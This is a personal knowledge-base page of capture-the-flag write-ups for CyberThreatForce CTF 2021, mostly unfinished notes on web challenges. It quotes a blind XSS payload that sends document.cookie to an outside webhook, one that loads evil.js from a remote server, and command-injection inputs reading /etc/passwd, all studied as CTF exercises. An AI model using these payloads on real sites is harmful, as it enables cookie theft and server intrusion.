<!DOCTYPE html><html><head><meta charSet="utf-8"/><meta http-equiv="x-ua-compatible" content="ie=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/><style data-href="/knowledge-base/styles.b8b36a527ec0b1421313.css" id="gatsby-global-css">.popover{position:relative;max-width:16rem;box-shadow:0 10px 15px -3px var(--shadow),0 4px 6px -2px rgba(0,0,0,.05);padding:1rem;border:1px solid var(--separator);border-radius:.5rem;background-color:var(--references-bg);max-height:16rem;overflow:hidden}.popover.no-max-width{max-width:90vw}.popover.with-markdown{font-size:.875rem}.popover h1{margin:0;padding:0;font-size:1rem}.popover ul{padding-left:1rem}.popover .more-content-blind{height:4rem;position:absolute;background:transparent;background:linear-gradient(0,var(--references-bg),var(--references-bg-80) 50%,var(--references-bg-0));top:12rem;width:100%;left:0}.tippy-box[data-animation=shift-away][data-state=hidden]{opacity:0}.tippy-box[data-animation=shift-away][data-state=hidden][data-placement^=top]{-webkit-transform:translateY(10px);transform:translateY(10px)}.tippy-box[data-animation=shift-away][data-state=hidden][data-placement^=bottom]{-webkit-transform:translateY(-10px);transform:translateY(-10px)}.tippy-box[data-animation=shift-away][data-state=hidden][data-placement^=left]{-webkit-transform:translateX(10px);transform:translateX(10px)}.tippy-box[data-animation=shift-away][data-state=hidden][data-placement^=right]{-webkit-transform:translateX(-10px);transform:translateX(-10px)}.reference{text-decoration:none}.reference:hover{color:var(--references-highlight)}.reference>div{padding-top:.5rem;padding-bottom:.5rem}.reference>div>p{margin:0;font-size:.875rem}.reference>div>ul{margin:0}.references-block{color:var(--references-text);padding:1rem;margin:1rem 0;border-radius:.5rem;background-color:var(--references-bg);transition:background-color .3s ease,color .3s ease}.references-block>div{margin-bottom:1rem}.references-block>hr{margin-left:auto;margin-right:auto;width:8rem}.references-block a{color:var(--references-text);transition:color .3s ease}.references-block>p:last-child{margin-bottom:0}.note-container{background:var(--note-bg);transition:background .3s ease}.note-container:first-child{border-left:none}.note-container .note-content,.note-container .obstructed-label{transition:opacity 75ms linear}.note-container .obstructed-label{display:block;color:var(--text);text-decoration:none;font-size:17px;line-height:40px;font-weight:500;-webkit-writing-mode:vertical-lr;-ms-writing-mode:tb-lr;writing-mode:vertical-lr;margin-top:36px;top:0;bottom:0;left:0;position:absolute;background-color:transparent;width:40px;overflow:hidden;opacity:0;transition:color .3s ease;pointer-events:none}.note-container.note-container-highlighted{background:var(--references-bg);transition:background .3s ease}.note-content img{max-width:100%}@media screen and (max-width:800px){.note-container{padding:16px;width:100%;overflow-y:auto}}@media screen and (min-width:801px){.note-container{transition:box-shadow .1s linear,opacity 75ms linear,-webkit-transform .2s cubic-bezier(.19,1,.22,1);transition:box-shadow .1s linear,opacity 75ms linear,transform .2s cubic-bezier(.19,1,.22,1);transition:box-shadow .1s linear,opacity 75ms linear,transform .2s cubic-bezier(.19,1,.22,1),-webkit-transform .2s cubic-bezier(.19,1,.22,1);flex-shrink:0;width:625px;max-width:625px;top:0;position:sticky;flex-grow:1;border-left:1px solid var(--separator);padding:0}.note-content{overflow-y:auto;height:100%;padding:32px}.note-container-overlay{box-shadow:0 0 15px 3px var(--shadow)}.note-container-obstructed .note-content{opacity:0}.note-container-obstructed .obstructed-label{opacity:1;pointer-events:all}}.dark-mode-toggle{cursor:pointer;-webkit-transform:scale(.6);transform:scale(.6)}.dark-mode-toggle input{display:none}.dark-mode-toggle input+div{border-radius:50%;width:36px;height:36px;position:relative;box-shadow:inset 16px -16px 0 0 #fff;-webkit-transform:scale(1) rotate(-2deg);transform:scale(1) rotate(-2deg);transition:box-shadow .5s ease 0s,-webkit-transform .4s ease .1s;transition:box-shadow .5s ease 0s,transform .4s ease .1s;transition:box-shadow .5s ease 0s,transform .4s ease .1s,-webkit-transform .4s ease .1s}.dark-mode-toggle input+div:before{content:"";width:inherit;height:inherit;border-radius:inherit;position:absolute;left:0;top:0;transition:background .3s ease}.dark-mode-toggle input+div:after{content:"";width:8px;height:8px;border-radius:50%;margin:-4px 0 0 -4px;position:absolute;top:50%;left:50%;box-shadow:0 -23px 0 var(--link),0 23px 0 var(--link),23px 0 0 var(--link),-23px 0 0 var(--link),15px 15px 0 var(--link),-15px 15px 0 var(--link),15px -15px 0 var(--link),-15px -15px 0 var(--link);-webkit-transform:scale(0);transform:scale(0);transition:all .3s ease}.dark-mode-toggle input:checked+div{box-shadow:inset 32px -32px 0 0 #fff;-webkit-transform:scale(.5) rotate(0deg);transform:scale(.5) rotate(0deg);transition:box-shadow .2s ease 0s,-webkit-transform .3s ease .1s;transition:transform .3s ease .1s,box-shadow .2s ease 0s;transition:transform .3s ease .1s,box-shadow .2s ease 0s,-webkit-transform .3s ease .1s}.dark-mode-toggle input:checked+:before{background:var(--link);transition:background .3s ease .1s}.dark-mode-toggle input:checked+:after{-webkit-transform:scale(1.5);transform:scale(1.5);transition:-webkit-transform .5s ease .15s;transition:transform .5s ease .15s;transition:transform .5s ease .15s,-webkit-transform .5s ease .15s}.graph-button{border:0;background:none;cursor:pointer}.graph-button svg g{stroke:var(--link)}.searchWrapper{position:relative;display:block}.inputWrapper{position:relative;color:var(--text)}.inputWrapper .searchIcon{position:absolute;fill:var(--link);left:2px;height:34px;padding:2px 2px 0;pointer-events:none}.inputWrapper input{color:var(--text);font-size:1rem;border:none;height:36px;padding-left:28px;background-color:var(--note-bg);transition:all .3s ease-in-out;width:28px}.inputWrapper input:focus{outline:none;width:100%}.results{-webkit-padding-start:0;padding-inline-start:0;position:absolute;display:block;top:100%;right:0;width:500px;max-height:50vh;background:var(--note-bg);box-shadow:-5px -5px 15px -3px var(--shadow),0 4px 6px -2px rgba(0,0,0,.05);overflow-y:auto;border-radius:8px}.results li{display:block;text-decoration:none;cursor:pointer;padding:16px 24px;border-bottom:1px solid var(--separator)}.results li:hover{background:var(--references-bg)}.results li .title{color:var(--text)}.results li .excerpt{color:var(--references-text)}@media screen and (max-width:600px){.results{right:-85px;width:calc(100vw - 40px)}}.lds-dual-ring:after{content:" ";left:calc(50% - 32px);position:relative;display:block;width:64px;height:64px;margin:8px;border-radius:50%;border-color:var(--separator);border-left:6px solid transparent;border-bottom:6px solid var(--separator);border-right:6px solid transparent;border-top:6px solid var(--separator);-webkit-animation:lds-dual-ring 1.2s ease-in-out infinite;animation:lds-dual-ring 1.2s ease-in-out infinite}@-webkit-keyframes lds-dual-ring{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}@keyframes lds-dual-ring{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}header{width:100%;min-height:57px;z-index:5;background-color:var(--note-bg);border-bottom:1px solid var(--separator);display:flex;justify-content:space-between;align-items:center;padding:10px 32px;flex-wrap:wrap;transition:background-color .3s ease}header>a{font-weight:700;color:var(--text);text-decoration:none;transition:color .3s ease}header .controls{display:flex}html{font-family:system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji;line-height:1.5}body.light-mode{--main-bg:#fafafc;--note-bg:#fff;--text:#1a202c;--separator:#e2e8f0;--shadow:rgba(0,0,0,0.1);--link:#3182ce;--references-bg:#ebf4ff;--references-bg-80:rgba(235,244,255,0.8);--references-bg-0:rgba(235,244,255,0);--references-text:#718096;--references-highlight:#4a5568}body.dark-mode{--main-bg:#000;--note-bg:#0a0d11;--text:#fafafc;--separator:#252525;--shadow:hsla(0,0%,100%,0.1);--link:#3da1ff;--references-bg:#17181a;--references-bg-80:rgba(23,24,26,0.8);--references-bg-0:rgba(23,24,26,0);--references-text:#8c9fbb;--references-highlight:#b3cbf0}body{background-color:var(--main-bg);color:var(--text);margin:0;padding:0;height:100vh;transition:background-color .3s ease,color .3s ease}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,p,pre{margin:0}*,:after,:before{box-sizing:border-box}h1,h2,h3{font-weight:700}hr{margin-top:1rem;margin-bottom:1rem;border:solid var(--separator);border-width:1px 0 0;box-sizing:content-box;height:0;overflow:visible}a{color:var(--link);text-decoration:underline;transition:color .3s ease}a:hover{text-decoration:none}h1{font-size:1.875rem;margin-top:1rem}h1,p{margin-bottom:1rem}.layout{height:100vh;display:flex;flex-direction:column}.note-columns-scrolling-container{display:flex;overflow-x:auto;overflow-y:hidden;flex-grow:1}.note-columns-container{display:flex;flex-grow:1;transition:width .1s cubic-bezier(.19,1,.22,1)}@media screen and (max-width:800px){.note-columns-container{width:unset!important}}.overlay{z-index:98;position:fixed;top:0;right:0;bottom:0;left:0;display:flex;align-items:center;justify-content:center;height:100%;width:100%;background-color:var(--shadow);-webkit-backdrop-filter:blur(4px);backdrop-filter:blur(4px)}.modal{z-index:99;position:fixed;border-radius:8px;background-color:var(--main-bg);box-shadow:-5px -5px 15px -3px var(--shadow),0 4px 6px -2px rgba(0,0,0,.05)}.modal-close,.modal-scale{position:absolute;top:0;right:0;padding:5px;border:0;background:none;color:var(--text);cursor:pointer}.modal-close svg,.modal-scale svg{width:20px;height:20px}.modal-close path,.modal-scale path{fill:currentColor}.modal-scale{right:30px}.modal-minimized .modal-close svg,.modal-minimized .modal-scale svg{width:15px;height:15px}.modal-minimized .modal-scale{right:25px}.modal-body{height:100%;width:100%}.modal-body .node,.modal-body .text{cursor:pointer}</style><meta name="generator" content="Gatsby 2.32.13"/><link as="script" rel="preload" href="/knowledge-base/webpack-runtime-f9e32b2d5cf509d0d960.js"/><link as="script" rel="preload" href="/knowledge-base/framework-06f646d936b841f99ebd.js"/><link as="script" rel="preload" href="/knowledge-base/app-40b771a08af14be06f07.js"/><link as="script" rel="preload" href="/knowledge-base/styles-407fe62976dc5310c43e.js"/><link as="script" rel="preload" href="/knowledge-base/component---node-modules-gatsby-theme-garden-src-templates-local-file-js-840e16bb326a4850cab3.js"/><link as="fetch" rel="preload" href="/knowledge-base/page-data/Practicality/CTFs/2021/CyberThreatForce CTF 2021/page-data.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/knowledge-base/page-data/sq/d/2098632890.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/knowledge-base/page-data/sq/d/2221750479.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/knowledge-base/page-data/sq/d/2468095761.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/knowledge-base/page-data/app-data.json" crossorigin="anonymous"/></head><body><div id="___gatsby"><div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper"><div class="layout"><header><a href="/knowledge-base/"><h3>Cloufish&#x27;s Knowledge Base</h3></a><div class="controls"><div class="searchWrapper" role="combobox" aria-expanded="false" aria-haspopup="listbox" aria-labelledby="downshift-4-label"><div class="inputWrapper"><svg class="searchIcon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M23.111 20.058l-4.977-4.977c.965-1.52 1.523-3.322 1.523-5.251 0-5.42-4.409-9.83-9.829-9.83-5.42 0-9.828 4.41-9.828 9.83s4.408 9.83 9.829 9.83c1.834 0 3.552-.505 5.022-1.383l5.021 5.021c2.144 2.141 5.384-1.096 3.239-3.24zm-20.064-10.228c0-3.739 3.043-6.782 6.782-6.782s6.782 3.042 6.782 6.782-3.043 6.782-6.782 6.782-6.782-3.043-6.782-6.782z"></path></svg><input type="text" aria-autocomplete="list" aria-labelledby="downshift-4-label" autoComplete="off" value="" id="downshift-4-input" placeholder="Search..."/></div></div><button title="Show Graph visualisation" aria-label="Show Graph visualisation" class="graph-button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" width="20" height="20"><g fill="none" stroke-width="2"><circle cx="11.733" cy="3.181" r="1.902"></circle><circle cx="16.864" cy="10.861" r="1.902"></circle><circle cx="7.47" cy="16.822" r="1.902"></circle><circle cx="3.046" cy="6.275" r="1.902"></circle><circle cx="9.372" cy="10.861" r="1.902"></circle><line x1="11.635" x2="14.655" y1="10.861" y2="10.861"></line><line x1="10" x2="10.895" y1="8.959" y2="5.573"></line><line x1="7.47" x2="4.5" y1="9.68" y2="7.5"></line><line x1="8.25" x2="8.809" y1="14.92" y2="13.088"></line></g></svg></button><label class="dark-mode-toggle" aria-label="Activate dark mode" title="Activate dark mode"><input type="checkbox" checked=""/><div></div></label></div></header><div class="note-columns-scrolling-container"><div class="note-columns-container" style="width:1250px"><div class="note-container   " style="left:0;right:-585px"><div class="note-content"><h1 id="cyberthreatforce-ctf-2021">CyberThreatForce CTF 2021</h1><h2 id="web-challs">Web Challs</h2><h3 id="raas_recruitment">Raas_Recruitment</h3><ul class="contains-task-list"><li class="task-list-item"><input type="checkbox" disabled=""/> <!-- -->Was Solved By Me</li></ul><h4 id="points---180---410">Points - 180 -&gt; 410</h4><h4 id="description">Description:</h4><p>We found the <strong>APT403</strong> recruitment site.
Tried to find a way to exploit their website !</p><p><strong><a href="https://recruitment.cyberthreatforce-ctf.com/"></a></strong></p><h4 id="write-up---my-own">Write-Up - MY OWN</h4><p> When entering the Website. We&#x27;re welcomed with
<img src="https://i.imgur.com/kMjLk9v.png"/>
After registration We get a message that the  review team will review the application
<img src="https://i.imgur.com/qTFY32g.png"/></p><ul><li><p>The site also uses <code>Content-Disposition: multipart/form-data;</code>, which is interesting </p></li><li><p>The webpage uses newest Apache, so no exploits for CVEs
<img src="https://github.com/W0rty/WU-CyberThreatForce/raw/main/Images/2.png" alt="alt"/></p></li><li><p><strong>There was Hint Given By Administrators</strong> - <strong>It&#x27;s not SQLi, try different Injection ^^</strong></p><ul><li>Not very useful Hint to be honest</li></ul></li></ul><h4 id="notes-after-the-competition---not-my-own-solution">Notes After The Competition - NOT MY OWN SOLUTION</h4><h5 id="finding-the-xss-and-exploiting-it">Finding the XSS and Exploiting It</h5><ul><li>There actually was a SQL Injection, which was not planned by the authors</li><li>The vulnerability was indeed in <code>Content-Disposition multipart body</code><ul><li>W0rty tried injecting -   <code>&quot;&gt;&#x27;&gt;&lt; script&gt;fetch(&quot;[https://webhook.site/670142c2-94c0-4669-a9ce-6539d860ce4c/?c=&quot;+document.cookie](https://webhook.site/670142c2-94c0-4669-a9ce-6539d860ce4c/?c=%22+document.cookie))&lt; /script&gt;</code>, which sends the request to his WebHook.<ul><li>Testing XSS with Blind Payloads is way better then just executing <code>alert()</code>, because most web pages sanitizes or filters out it. Amazing!
<img src="https://github.com/W0rty/WU-CyberThreatForce/raw/main/Images/3.png" alt="alt"/></li><li>The last parameter <code>name=radio</code> triggered the XSS payload.</li></ul></li><li>W0rty tried to leak /admin/index.php source code with this Blind XSS with the following script</li><li><img src="https://github.com/W0rty/WU-CyberThreatForce/raw/main/Images/4.png" alt="alt"/><ul><li>But the website was limiting the size of his payload<ul><li>He then put the payload into his VPS, and with this payload -&gt;   <code>&quot;&gt;&#x27;&gt;&lt; script src=&quot;https://midnightflag.fr/evil.js&quot;&gt;&lt; /script&gt;</code> he invoked this code<ul><li>This though didn&#x27;t work either. It seemed like the index.php source code that he wanted to extract was too big, so he then used <code>substr</code> function to select part of the HTML page:</li><li><img src="https://github.com/W0rty/WU-CyberThreatForce/raw/main/Images/5.png" alt="alt"/><ul><li>This time it succeeded, and he found out from the source code, that the page has a hidden web-page, called <code>/bingvxyyaknprxtgwexgldwdcrcqrfacDEV/</code></li></ul></li></ul></li></ul></li></ul></li></ul></li></ul><h5 id="analyzing-hidden-page">Analyzing Hidden Page</h5><ul><li>After W0rty read the HTML, he noticed weird javascript endpoint called <code>prcmSDAui9SeXxbuuaUKjEAJ5qIGY9B9vPFMwW19.js</code><ul><li>This JavaScript was obfuscated. After the obfuscation, it seems like it&#x27;s about the creation of &quot;Dev&quot; user account<ul><li><strong>Keep in mind, that only an admin could create a user account, and so W0rty had to perform CSRF Attack, through XSS Injection </strong><ul><li>SOURCE CODE PROVIDED FOR THE &#x27;BOT&#x27; IS ON THE AUTHOR&#x27;S ORIGINAL WRITE-UP<ul><li>The first implementation of the bot didn&#x27;t work, and so he W0rty tried to implement the CSRF in <code>multipart/form-data</code>, just like we saw at the &#x27;Contact Form&#x27; in the beginning<ul><li>SOURCE CODE PROVIDED FOR THE &#x27;BOT&#x27; IS ON THE AUTHOR&#x27;S ORIGINAL WRITE-UP<ul><li><strong>This worked and W0rty received an attack</strong>. </li></ul></li></ul></li></ul></li></ul></li></ul></li></ul></li><li>There were so much in this challenge. It is interesting that initially the Challenge was rated for 180 points(the easiest challenge), and later to 410 points. Maybe authors made it more complicated?</li><li>Compared to me, W0rax did an amazing job!</li></ul><h5 id="lessons-taken">Lessons taken:</h5><ul><li>Test XSS with Blind Payloads</li><li>Have an ability to host your payloads on your own VPS</li><li>Check which type of data the WebApp accepts when building your payload</li><li>And a lot more, related to just W0rty Backend Web Programming Skills!
</li></ul><h5 id="references">References:</h5><p><a href="https://github.com/W0rty/WU-CyberThreatForce/blob/main/README-EN.md">W0rty Write-Up</a></p><hr/><h3 id="botnetflooder">BotnetFlooder</h3><ul class="contains-task-list"><li class="task-list-item"><input type="checkbox" disabled=""/> <!-- -->Was Solved By Me</li></ul><h4 id="points----200">Points -  200</h4><h4 id="description-1">Description:</h4><p>Hello CTF-Agent,</p><p>We found a website, used by the APT-403, that, thanks to a botnet, executes ddos attacks on some targets.</p><p>Your mission will be to find a way in the web server.</p><p>H.Q</p><p><strong>Instance Pannel</strong></p><p><a href="http://144.217.73.235:8739">http://144.217.73.235:8739</a></p><p>Ports bind:8739 =&gt;80/tcp</p><h4 id="write-up">Write-Up</h4><p><img src="https://i.imgur.com/SEbLFav.png"/></p><ul><li>We need to insert a query, the translation of the Russian is &quot;Choose your goal&quot;</li><li>When we submit a query (need to be integer/id), we see that it&#x27;s a form to attack the Victim<ul><li>Later We&#x27;ll see, that this id represents actually ip address of the victim</li><li><img src="https://i.imgur.com/L8PeAqn.png"/></li></ul></li></ul><p><img src="https://i.imgur.com/3oWRuSF.png"/></p><h5 id="os-command-injection">OS COMMAND INJECTION</h5><ul><li>The website is probably taking the id, and then adding it to a shell command. This is great place for <strong>OS Command Injection</strong></li><li>When we execute <code>127.0.0.1;whoami</code> Query is filtered  and doesn&#x27;t allow non-integer values. Giving us <strong>invalid literal for int() with base 10: &#x27;1;whoami&#x27;</strong> Error<ul><li><img src="https://i.imgur.com/TKSZbUh.png"/></li><li>Let&#x27;s google this error and see what we can find! It&#x27;s usually good to google the Error messages, to identify the framework, language used etc.<ul><li>We get <a href="https://stackoverflow.com/questions/1841565/valueerror-invalid-literal-for-int-with-base-10">https://stackoverflow.com/questions/1841565/valueerror-invalid-literal-for-int-with-base-10</a> AND <a href="https://careerkarma.com/blog/python-valueerror-invalid-literal-for-int-with-base-10/">https://careerkarma.com/blog/python-valueerror-invalid-literal-for-int-with-base-10/</a></li><li>So the <strong>website uses Python!</strong></li></ul></li></ul></li><li><strong>The main Problem: Executing OS Injection using only Integers OR Escape conversion to float</strong><ul><li>The Web Page is probably checking If the query is string or not<ul><li>We pass this check with <code>127.0.0.1;whoami</code>.  It&#x27;s just that query can&#x27;t be parsed </li></ul></li><li>Tweaking did not give me any good, so <strong>I setup fuzzing with OS Injection Payloads</strong></li><li><img src="https://i.imgur.com/4bK9X1p.png"/><ul><li>When examining the requests, <strong>I saw additional Errors</strong>:<ul><li><code>unexpected character after line continuation character (&amp;lt;string&amp;gt;, line 1)</code> for <code>127.0.0.1 whoami&#x27;|type %SYSTEMROOT%\win.ini</code></li><li><code>name &amp;#39;cat&amp;#39; is not defined</code> for <code>127.0.0.1 whoami&#x27;&amp;cat /etc/passwd&amp;&#x27;</code><ul><li>This one is interesting. It shows us that the &#x27;parser&#x27; tries to get a variable of &#x27;car&#x27;. It can indicate <strong>that we successfully escaped the float parser with <code>127.0.0.1&#x27;&amp;whoami&amp;&#x27;</code></strong></li><li>When executing <code>127.0.0.1&#x27;&amp;eval(whoami)&amp;&#x27;</code> I finally get some success<ul><li><img src="https://i.imgur.com/93klsVd.png"/></li></ul></li><li>Now we need to <strong>Bypass the Filter</strong><ul><li>This again involves fuzzing. First I tried to fuzz the parameter in parenthesis <code>whoami</code>. This didn&#x27;t give me anything, so <strong>it&#x27;s probably blocking eval</strong></li><li>Tried to determine what is Filtered and What is not.<ul><li>Filters:<ul><li><code>eval()</code></li><li><code>import (...)</code></li><li><code>127.0.0.1&#x27;from module subprocess import subprocess.run(&#x27;ls&#x27;)&#x27;</code> - Gets filtered because of <code>import</code> keyword</li></ul></li><li>Does Not Filter:<ul><li><code>print</code></li><li><code>subprocess.run(&#x27;ls&#x27;)</code><ul><li>This is the function that I&#x27;ll try to use. <strong>THE MISSION: IMPORT THIS MODULE WITHOUT USING THE IMPORT KEYWORD D:</strong></li><li><a href="https://www.youtube.com/watch?v=2Fp1N6dof0Y">Tutorial on subprocess module</a></li></ul></li><li><code>127.0.0.1&#x27;from module subprocess subprocess.run(&#x27;ls&#x27;)&#x27;</code> - Doesn&#x27;t get filtered because of lack of <code>import</code> keyword</li><li>When the page&#x27;s not filtering, it outputs <strong>error: </strong> <code>invalid syntax (&lt;string&gt;, line 1)</code></li></ul></li></ul></li></ul></li></ul></li><li><strong>These payloads somehow doesn&#x27;t produce error with query not being valid int/float, so it&#x27;s good to examine it more.</strong></li></ul></li></ul></li></ul></li></ul><h4 id="notes-after-the-competition">Notes After The Competition</h4><ul><li>It seemed that there was a <code>flag.txt</code> that could be opened with <code>open(&#x27;flag.txt&#x27;).read()</code> function</li></ul><h5 id="lessons-to-be-taken">Lessons to be taken:</h5><ul><li>Always assume, that in the case of Web Challenges, the flag is always in the main/root directory of the website / the context in which the <code>index</code> file is located</li></ul><h5 id="references-1">References</h5><ul><li>Psycholog1st</li><li>!<a href="/knowledge-base/Pasted-image-20210705184114.png" title="Pasted image 20210705184114.png">[[Pasted image 20210705184114.png]]</a></li><li>!<a href="/knowledge-base/Pasted-image-20210705184401.png" title="Pasted image 20210705184401.png">[[Pasted image 20210705184401.png]]</a></li></ul><hr/><h3 id="bitcoinminer-med">BitcoinMiner-Med</h3><ul class="contains-task-list"><li class="task-list-item"><input type="checkbox" disabled=""/> <!-- -->Was Solved By Me</li></ul><h4 id="points---200">Points - 200</h4><h4 id="description-2">Description:</h4><p>Hello CTF-Agent,</p><p>We found a site, used by the APT-403 to mine bitcoin on botnet&#x27;s computers. This site seems to be using a strong encryption algorithm.</p><p>Your mission will be to get into the admin panel.</p><p>H.Q</p><h4 id="write-up-1">Write-Up</h4><p><img src="https://i.imgur.com/LGCkJCr.png"/></p><ul><li><p>The site asks us for Bitcoin Address and Password in a form</p><ul><li>Checks if the bitcoin address is in a valid form</li><li>Using the site <a href="https://randommer.io/bitcoin-address-generator">https://randommer.io/bitcoin-address-generator</a> we can generate a fake one<ul><li>But even with a fake Bitcoin Wallet Address (<code>thLbPingAUrJcRyERuGZvpGdXX5FGV3RY</code>, get an error &#x27;Invalid Bitcoin Adress&#x27;</li></ul></li></ul></li><li><p>Let&#x27;s try to find SQL Injection and dumb the database of the &#x27;valid&#x27; bitcoin addresses AND passwords...</p><ul><li><strong>Maybe later...</strong></li></ul></li><li><p><strong>From the Hint that was provided, there&#x27;s algo directory, in there We&#x27;ve got:</strong>
<img src="https://i.imgur.com/Hbx3mx6.png"/></p><pre><code>- &quot;Выберите свою цель &quot; -&gt; &quot; Choose your goal &quot;
    - Don&#x27;t know if it relates to the challenge neccessarily,
- The graph show the **XOR** decryption function via bruteforce with ciphertext and cleartext parameters
    - But where we can find these parameters to decypher them?
        - From the Hint we received, there might be other hidden directories/files on this webpage
</code></pre></li></ul><h4 id="notes-after-the-competition-1">Notes After The Competition</h4><hr/><h3 id="forum403">Forum403</h3><ul class="contains-task-list"><li class="task-list-item"><input type="checkbox" disabled=""/> <!-- -->Was Solved By Me</li></ul><h4 id="points---400">Points - 400</h4><h4 id="description-3">Description:</h4><p>Agent of CyberThreatForce,</p><p>APT 403 has a forum where they sell their ransomware. Your mission is to pawn the admin account of the website in order to paralyze their income. You can access it there: <a href="http://51.68.72.26/">http://51.68.72.26/</a> Please do not use the docker instance through CTFd for availability reasons.</p><p>Best of luck and may the hack be with you.</p><p>Headquarters of CyberThreatForce</p><h4 id="write-up-2">Write-Up</h4><ul><li>From the description, it seems We have to perform CSRF Attack
<img src="https://i.imgur.com/4hrpAYE.png"/></li><li>After trying basic SQL Injection... we get to inscription.php:
<img src="https://i.imgur.com/5pWH8iA.png"/></li><li>The first time I saw It I really got scared! xD</li><li>I downloaded the <code>trollface.png</code> file	and performed basic steganography steps like extracting with binwalk, uncompressing with zlib-flate, but nothing :/ a dead end indeed</li></ul><h4 id="notes-after-the-competition-2">Notes After The Competition</h4><hr/><h3 id="trojan-tools">Trojan Tools</h3><ul class="contains-task-list"><li class="task-list-item"><input type="checkbox" disabled=""/> <!-- -->Was Solved By Me</li></ul><h4 id="points---75">Points - 75</h4><h4 id="description-4">Description:</h4><p>We has find this tools in computer of script kiddies , you need to find the secret of this program.</p><p><a href="">TROJAN_TOOLS.EXE EMBEDDED</a></p><h4 id="write-up-3">Write-Up</h4><ul><li></li></ul><h4 id="notes-after-the-competition-3">Notes After The Competition</h4><hr/></div><a class="obstructed-label" href="/knowledge-base/Practicality/CTFs/2021/CyberThreatForce CTF 2021">CyberThreatForce CTF 2021</a></div></div></div></div></div><div id="gatsby-announcer" style="position:absolute;top:0;width:1px;height:1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border:0" aria-live="assertive" aria-atomic="true"></div></div><script id="gatsby-script-loader">/*<![CDATA[*/window.pagePath="/Practicality/CTFs/2021/CyberThreatForce CTF 2021";/*]]>*/</script><script id="gatsby-chunk-mapping">/*<![CDATA[*/window.___chunkMapping={"polyfill":["/polyfill-b26ca15045427b9506aa.js"],"app":["/app-40b771a08af14be06f07.js"],"component---node-modules-gatsby-theme-garden-src-templates-local-file-js":["/component---node-modules-gatsby-theme-garden-src-templates-local-file-js-840e16bb326a4850cab3.js"]};/*]]>*/</script><script src="/knowledge-base/polyfill-b26ca15045427b9506aa.js" nomodule=""></script><script src="/knowledge-base/component---node-modules-gatsby-theme-garden-src-templates-local-file-js-840e16bb326a4850cab3.js" async=""></script><script src="/knowledge-base/styles-407fe62976dc5310c43e.js" async=""></script><script src="/knowledge-base/app-40b771a08af14be06f07.js" async=""></script><script src="/knowledge-base/framework-06f646d936b841f99ebd.js" async=""></script><script src="/knowledge-base/webpack-runtime-f9e32b2d5cf509d0d960.js" async=""></script></body></html>